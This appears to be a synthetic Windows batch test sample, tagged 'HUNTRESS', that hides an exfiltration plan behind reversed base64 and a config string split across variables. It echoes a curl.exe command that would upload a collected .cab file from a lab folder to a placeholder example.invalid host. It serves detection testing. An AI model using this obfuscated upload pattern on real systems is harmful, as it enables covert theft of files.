@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:reversed_text|identity
rem HUNTRESS-MATERIAL:==AZh9GbwV3LklGbhZnbp5SZsBXbhhXZuIDZkFTYwgTNzIzLvozcwRHdo1DbyV3XkF2bsBXd8JWYj5iMkRWMhBDO1MjMtQ3YlxGbvNGXiFGTzNXZyRnb1hEXjlGbiVHUcNnclNXVcpzQ9gGdhB3XlNmc192c8JDZkFTYwgTNzITLudWahBXbhNWPkl2XudWahBXbhNGfl52bu1TZnFWdn5WYs9Fd4Vmb8RXdv9lbhZWPoBXYydGfx0DduV3bj9VZnFGdzxXZ4VmLsJXdj1jclRHchRWY8VGdv1WZy9FZh9GbwVHLyVmZz5WYyR3XlJXYwVmcwxCbhN2bs9VZ0F2YvxWPzBXZ0NHfx0jd
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "h0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=curl."& rem HUNTRESS quote compound
set "h1=exe|stage_count=1|graph=fan_out|next_language=none|campaign_id=camp"& rem HUNTRESS quote compound
set "h2=aign-23580a1dd2|source_path=C:\Users\Public\HuntressLab\collect-235"& rem HUNTRESS quote compound
set "h3=80a1dd2.cab|upload_url=https://23580a1dd2.example.invalid/upload"& rem HUNTRESS quote compound
goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_arithmetic=e6763e6a"
call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
call set "cfg=%%h0%%%%h1%%%%h2%%%%h3%%"
exit /b 0
:HUNTRESS_EMIT
echo(!cfg!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo curl.exe upload C:\Users\Public\HuntressLab\collect-23580a1dd2.cab to https://23580a1dd2.example.invalid/upload
exit /b 0
